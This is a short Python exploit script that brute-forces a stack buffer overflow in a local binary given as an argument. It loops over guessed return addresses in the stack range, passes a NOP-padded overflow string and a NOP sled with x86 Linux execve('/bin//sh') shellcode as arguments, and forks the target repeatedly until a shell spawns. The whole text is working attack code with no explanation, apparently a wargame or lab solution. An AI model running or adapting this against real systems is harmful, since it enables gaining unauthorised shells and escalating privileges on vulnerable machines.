#!/usr/bin/python

import sys,os

TARGET = os.getcwd() + "/" + sys.argv[1]

for high in range(0xff,0x00,-1):
    for low in range(0x00,0x100,50):
        payload = "\x90"*44
        retn = chr(low)+chr(high)+"\xff\xbf"
        payload = payload + retn
        nop = "\x90"*100
        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
        shell = nop + shellcode

        pid = os.fork()
        if pid == 0:
            os.execv(TARGET,(shell,payload))
        else:
            os.wait()
